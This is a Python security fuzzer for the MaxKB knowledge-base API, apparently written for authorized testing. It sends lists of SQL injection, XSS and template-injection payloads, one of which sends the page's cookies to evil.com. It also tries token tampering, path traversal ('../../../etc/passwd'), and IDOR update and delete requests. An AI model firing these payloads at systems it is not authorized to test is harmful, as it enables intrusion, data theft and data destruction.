"""
knowledge_base_fuzzer.py - MaxKB API Security Fuzzer (Fixed: correct /admin/api paths)
Tests: SQL Injection, XSS, Unauthorized Access, Boundary Values, IDOR
"""
import os, json, time, argparse, requests, uuid
from datetime import datetime

class KnowledgeBaseFuzzer:
    def __init__(self, base_url, token, dataset_id, results_dir="results"):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.dataset_id = dataset_id
        self.results_dir = results_dir
        os.makedirs(results_dir, exist_ok=True)
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": token,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        self.results = []

    def _record(self, test_name, category, method, url, payload, response=None, error=None):
        result = {
            "test_name": test_name, "category": category,
            "method": method, "url": url,
            "payload": str(payload)[:500] if payload else None,
            "timestamp": datetime.now().isoformat(),
        }
        if response is not None:
            result["http_status"] = response.status_code
            result["response_time"] = response.elapsed.total_seconds()
            try:
                rj = response.json()
                result["api_code"] = rj.get("code")
                result["api_message"] = rj.get("message", "")
                result["response_body"] = rj
            except:
                result["response_body"] = response.text[:500]
                result["api_code"] = None

            api_code = result.get("api_code")
            if api_code == 500 or response.status_code >= 500:
                result["is_bug"] = True
                result["bug_type"] = "SERVER_ERROR"
                msg = result.get("api_message", "")[:80]
                print(f"    [BUG!] => code={api_code} msg={msg}")
            elif api_code == 401:
                result["is_bug"] = False
                result["auth_blocked"] = True
            else:
                result["is_bug"] = False
        elif error:
            result["error"] = str(error)[:300]
            result["is_bug"] = True
            result["bug_type"] = "CONNECTION_ERROR"
            print(f"    [BUG!] => {error}")
        else:
            result["is_bug"] = False
        self.results.append(result)
        return result

    def _request(self, method, path, test_name, category, **kwargs):
        url = self.base_url + path
        payload = kwargs.get('json') or kwargs.get('data') or kwargs.get('params')
        try:
            resp = self.session.request(method, url, timeout=30,
                                        allow_redirects=False, **kwargs)
            ct = resp.headers.get('Content-Type', '')
            is_json = 'json' in ct
            if is_json:
                try:
                    rj = resp.json()
                    api_code = rj.get('code', 'N/A')
                except:
                    api_code = 'parse_err'
            else:
                api_code = 'not_json'

            bug = ""
            if (is_json and api_code == 500) or resp.status_code >= 500:
                bug = " [BUG!]"
            print(f"    {method} {path} => HTTP {resp.status_code} code={api_code}{bug}")
            return self._record(test_name, category, method, url, payload, response=resp)
        except requests.exceptions.Timeout:
            print(f"    {method} {path} => TIMEOUT [BUG!]")
            return self._record(test_name, category, method, url, payload, error="Timeout 30s")
        except Exception as e:
            print(f"    {method} {path} => ERROR: {e}")
            return self._record(test_name, category, method, url, payload, error=str(e))

    # ================================================================
    # Test 1: SQL Injection
    # ================================================================
    def test_sql_injection(self):
        print("\n" + "=" * 60)
        print("[1/5] SQL Injection Tests")
        print("=" * 60)
        DS = self.dataset_id
        sql_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE dataset; --",
            "' UNION SELECT username,password FROM auth_user --",
            "1' AND SLEEP(5) --", "1; WAITFOR DELAY '0:0:5' --",
            "' OR 1=1#", "admin'--", "1' ORDER BY 100--",
            "' UNION SELECT NULL,NULL,NULL--",
            "\\'; EXEC xp_cmdshell('whoami'); --",
        ]
        search_paths = [
            "/admin/api/workspace/default/knowledge?name={payload}",
            f"/admin/api/workspace/default/knowledge/{DS}?name={{payload}}",
            f"/admin/api/workspace/default/knowledge/{DS}/document?search={{payload}}",
        ]
        for i, payload in enumerate(sql_payloads):
            print(f"\n  [{i+1}/{len(sql_payloads)}] Payload: {payload[:50]}...")
            for path_tpl in search_paths:
                path = path_tpl.format(payload=requests.utils.quote(payload))
                self._request("GET", path, f"sqli_get_{i+1}", "SQL_INJECTION")
            # POST create knowledge base with SQL payload
            self._request("POST", "/admin/api/workspace/default/knowledge",
                          f"sqli_post_name_{i+1}", "SQL_INJECTION",
                          json={"name": payload, "desc": "test", "type": "0"})
            time.sleep(0.3)

    # ================================================================
    # Test 2: XSS Injection
    # ================================================================
    def test_xss_injection(self):
        print("\n" + "=" * 60)
        print("[2/5] XSS Injection Tests")
        print("=" * 60)
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "<iframe src='javascript:alert(1)'>",
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{constructor.constructor('return this')()}}",
            "<img src=x onerror=fetch('http://evil.com/steal?c='+document.cookie)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        ]
        for i, payload in enumerate(xss_payloads):
            print(f"\n  [{i+1}/{len(xss_payloads)}] Payload: {payload[:50]}...")
            self._request("POST", "/admin/api/workspace/default/knowledge",
                          f"xss_name_{i+1}", "XSS",
                          json={"name": payload, "desc": "xss test", "type": "0"})
            self._request("POST", "/admin/api/workspace/default/knowledge",
                          f"xss_desc_{i+1}", "XSS",
                          json={"name": f"xss_test_{i}", "desc": payload, "type": "0"})
            time.sleep(0.3)

    # ================================================================
    # Test 3: Unauthorized Access
    # ================================================================
    def test_unauthorized_access(self):
        print("\n" + "=" * 60)
        print("[3/5] Unauthorized Access Tests")
        print("=" * 60)
        DS = self.dataset_id
        original_token = self.session.headers.get("Authorization")

        protected_endpoints = [
            ("GET", "/admin/api/workspace/default/knowledge"),
            ("GET", f"/admin/api/workspace/default/knowledge/{DS}"),
            ("GET", f"/admin/api/workspace/default/knowledge/{DS}/document"),
            ("POST", "/admin/api/workspace/default/knowledge"),
            ("DELETE", f"/admin/api/workspace/default/knowledge/{DS}"),
            ("GET", "/admin/api/user/profile"),
            ("GET", "/admin/api/user/list"),
            ("GET", "/admin/api/workspace/default/application"),
            ("GET", "/admin/api/workspace/default/model"),
        ]

        # No token
        print("\n  [No Token Test]")
        self.session.headers.pop("Authorization", None)
        for method, path in protected_endpoints:
            body = {"name": "unauth_test", "type": "0"} if method == "POST" else None
            self._request(method, path, f"no_token_{method}_{path.split('/')[-1]}", "UNAUTHORIZED", json=body)
        time.sleep(0.3)

        # Invalid tokens
        print("\n  [Invalid Token Test]")
        invalid_tokens = [
            "Bearer invalidtoken123",
            "Bearer " + "A" * 500,
            "InvalidFormat",
            "", "Bearer null", "Bearer undefined",
            "Basic YWRtaW46YWRtaW4=",
        ]
        for token in invalid_tokens:
            self.session.headers["Authorization"] = token
            self._request("GET", "/admin/api/workspace/default/knowledge",
                          f"invalid_token_{token[:20]}", "UNAUTHORIZED")
        time.sleep(0.3)

        # Tampered token
        print("\n  [Tampered Token Test]")
        if original_token:
            parts = original_token.replace("Bearer ", "").split(":")
            if len(parts) >= 2:
                tampered = "Bearer " + parts[0] + ":tampered:" + parts[-1]
                self.session.headers["Authorization"] = tampered
                self._request("GET", "/admin/api/workspace/default/knowledge",
                              "tampered_token", "UNAUTHORIZED")

        # Restore
        self.session.headers["Authorization"] = original_token

    # ================================================================
    # Test 4: Boundary Values
    # ================================================================
    def test_boundary_values(self):
        print("\n" + "=" * 60)
        print("[4/5] Boundary Value Tests")
        print("=" * 60)
        DS = self.dataset_id

        print("\n  [Long Input]")
        for length in [256, 1000, 10000, 100000]:
            self._request("POST", "/admin/api/workspace/default/knowledge",
                          f"long_name_{length}", "BOUNDARY",
                          json={"name": "A" * length, "desc": "boundary test", "type": "0"})
            time.sleep(0.3)

        print("\n  [Special Characters]")
        special_names = [
            "", " ", "\n\r\t", "\x00", "a\x00b",
            "../../../etc/passwd", "CON", "NUL",
        ]
        for i, name in enumerate(special_names):
            self._request("POST", "/admin/api/workspace/default/knowledge",
                          f"special_name_{i}", "BOUNDARY",
                          json={"name": name, "desc": "test", "type": "0"})
            time.sleep(0.2)

        print("\n  [Invalid Document IDs]")
        invalid_ids = [
            "0", "-1", "99999999", "not-a-uuid", "' OR 1=1 --",
            str(uuid.uuid4()), "../../../etc/passwd", "null", "undefined", "NaN",
            "30", "abc", "1",
        ]
        for i, bad_id in enumerate(invalid_ids):
            self._request("GET", f"/admin/api/workspace/default/knowledge/{DS}/document/{bad_id}",
                          f"invalid_doc_id_{i}_{bad_id[:20]}", "BOUNDARY")
            time.sleep(0.2)

        print("\n  [Invalid Knowledge Base IDs]")
        for i, bad_id in enumerate(invalid_ids[:8]):
            self._request("GET", f"/admin/api/workspace/default/knowledge/{bad_id}",
                          f"invalid_kb_id_{i}", "BOUNDARY")
            self._request("DELETE", f"/admin/api/workspace/default/knowledge/{bad_id}",
                          f"delete_invalid_kb_{i}", "BOUNDARY")
            time.sleep(0.2)

        print("\n  [Abnormal Request Body]")
        self._request("POST", "/admin/api/workspace/default/knowledge",
                      "empty_body", "BOUNDARY", json=None, data="")
        self._request("POST", "/admin/api/workspace/default/knowledge",
                      "array_body", "BOUNDARY", json=[1, 2, 3])
        self._request("POST", "/admin/api/workspace/default/knowledge",
                      "number_body", "BOUNDARY", json=12345)
        # Wrong Content-Type
        orig_ct = self.session.headers.get("Content-Type")
        self.session.headers["Content-Type"] = "text/plain"
        self._request("POST", "/admin/api/workspace/default/knowledge",
                      "wrong_content_type", "BOUNDARY", data="not json")
        self.session.headers["Content-Type"] = orig_ct or "application/json"

    # ================================================================
    # Test 5: IDOR
    # ================================================================
    def test_idor(self):
        print("\n" + "=" * 60)
        print("[5/5] IDOR Tests")
        print("=" * 60)

        print("\n  [Random Knowledge Base Access]")
        for i in range(5):
            fake_id = str(uuid.uuid4())
            self._request("GET", f"/admin/api/workspace/default/knowledge/{fake_id}",
                          f"idor_fake_kb_{i}", "IDOR")
            self._request("GET", f"/admin/api/workspace/default/knowledge/{fake_id}/document",
                          f"idor_fake_docs_{i}", "IDOR")
            self._request("PUT", f"/admin/api/workspace/default/knowledge/{fake_id}",
                          f"idor_update_fake_{i}", "IDOR",
                          json={"name": "hacked", "desc": "idor test"})
            self._request("DELETE", f"/admin/api/workspace/default/knowledge/{fake_id}",
                          f"idor_delete_fake_{i}", "IDOR")
            time.sleep(0.3)

        print("\n  [Cross-workspace Access]")
        workspaces = ["admin", "test", "other", "../default", "default/../../admin"]
        for ws in workspaces:
            self._request("GET", f"/admin/api/workspace/{ws}/knowledge",
                          f"idor_workspace_{ws[:20]}", "IDOR")
            self._request("GET", f"/admin/api/workspace/{ws}/application",
                          f"idor_workspace_app_{ws[:20]}", "IDOR")
            time.sleep(0.2)

        print("\n  [User Enumeration]")
        for i in range(3):
            fake_user = str(uuid.uuid4())
            self._request("GET", f"/admin/api/user/{fake_user}",
                          f"idor_user_{i}", "IDOR")

    # ================================================================
    # Main
    # ================================================================
    def run_all_tests(self):
        print("=" * 70)
        print("MaxKB API Security Fuzzer")
        print("=" * 70)
        print(f"Target: {self.base_url}")
        print(f"API Prefix: /admin/api/")
        print(f"Dataset ID: {self.dataset_id}")
        print(f"Time: {datetime.now().isoformat()}")
        print()

        # Verify connectivity
        print("[*] Verifying API connectivity...")
        r = self.session.get(f"{self.base_url}/admin/api/user/profile",
                             allow_redirects=False, timeout=10)
        try:
            rj = r.json()
            print(f"  Profile API: HTTP {r.status_code}, code={rj.get('code')}")
            if rj.get('code') == 200:
                print(f"  [OK] Authenticated as: {rj['data'].get('username','')}")
            else:
                print(f"  [WARNING] Auth may have issues: {rj.get('message','')}")
        except:
            print(f"  [ERROR] Non-JSON response, HTTP {r.status_code}")
        print()

        self.test_sql_injection()
        self.test_xss_injection()
        self.test_unauthorized_access()
        self.test_boundary_values()
        self.test_idor()
        self.generate_report()

    def generate_report(self):
        bugs = [r for r in self.results if r.get("is_bug")]
        report = {
            "meta": {"target": self.base_url, "dataset_id": self.dataset_id,
                     "total_tests": len(self.results),
                     "timestamp": datetime.now().isoformat()},
            "summary": {
                "total": len(self.results),
                "bugs_found": len(bugs),
                "by_category": {},
                "api_code_distribution": {},
            },
            "bugs": bugs,
            "all_results": self.results,
        }
        categories = set(r["category"] for r in self.results)
        for cat in categories:
            cat_results = [r for r in self.results if r["category"] == cat]
            cat_bugs = [r for r in cat_results if r.get("is_bug")]
            report["summary"]["by_category"][cat] = {
                "total": len(cat_results), "bugs": len(cat_bugs),
            }
        for r in self.results:
            code = str(r.get("api_code", r.get("http_status", "UNKNOWN")))
            report["summary"]["api_code_distribution"][code] = \
                report["summary"]["api_code_distribution"].get(code, 0) + 1

        rp = os.path.join(self.results_dir, "api_fuzzing_report.json")
        with open(rp, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print("\n" + "=" * 70)
        print("API Fuzzing Test Report")
        print("=" * 70)
        print(f"Total tests: {report['summary']['total']}")
        print(f"Bugs found: {report['summary']['bugs_found']}")
        print(f"\nBy category:")
        for cat, stats in report['summary']['by_category'].items():
            bug_str = f" [!!! {stats['bugs']} BUGS]" if stats['bugs'] > 0 else " [OK]"
            print(f"  {cat}: {stats['total']} tests{bug_str}")
        print(f"\nAPI code distribution:")
        for code, count in sorted(report['summary']['api_code_distribution'].items()):
            print(f"  {code}: {count}")
        if bugs:
            print(f"\n{'='*70}")
            print(f"BUG DETAILS ({len(bugs)} found):")
            print(f"{'='*70}")
            for i, bug in enumerate(bugs[:30], 1):
                print(f"\n  #{i} [{bug['category']}] {bug['test_name']}")
                print(f"     {bug['method']} {bug['url']}")
                print(f"     API code: {bug.get('api_code','N/A')}, msg: {bug.get('api_message','')[:120]}")
        print(f"\nReport: {os.path.abspath(rp)}")

def main():
    p = argparse.ArgumentParser(description="MaxKB API Security Fuzzer")
    p.add_argument("--base-url", default="http://localhost:8080")
    p.add_argument("--token", required=True)
    p.add_argument("--dataset-id", required=True)
    p.add_argument("--results-dir", default="results")
    a = p.parse_args()
    KnowledgeBaseFuzzer(a.base_url, a.token, a.dataset_id, a.results_dir).run_all_tests()

if __name__ == "__main__":
    main()
